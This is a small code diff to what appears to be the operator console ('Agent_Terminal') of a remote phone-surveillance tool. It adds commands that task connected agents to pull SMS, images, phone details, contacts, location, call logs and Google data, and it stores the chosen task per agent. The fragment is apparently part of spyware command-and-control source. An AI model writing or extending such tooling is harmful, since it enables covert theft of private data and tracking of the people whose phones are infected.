@@ -66,8 +66,9 @@ class Agent_Terminal(Cmd):
 
     # Agent commands here
     def do_do(self, args):
-        "Usage: do <command>\n\nCurrent commands: sms, app\n"
+        "Usage: do <command>\n\nCurrent commands: \n-sms\n-app\n-images\n-phonedetails\n-contacts\n-location\n-callLog\n-googledata\n"
         if args in self.commands:
+            main.agent_command[main.interacted_agent] = args
             with open(f"task/{main.interacted_agent}", "w") as f:
                 f.write(args)
         else:
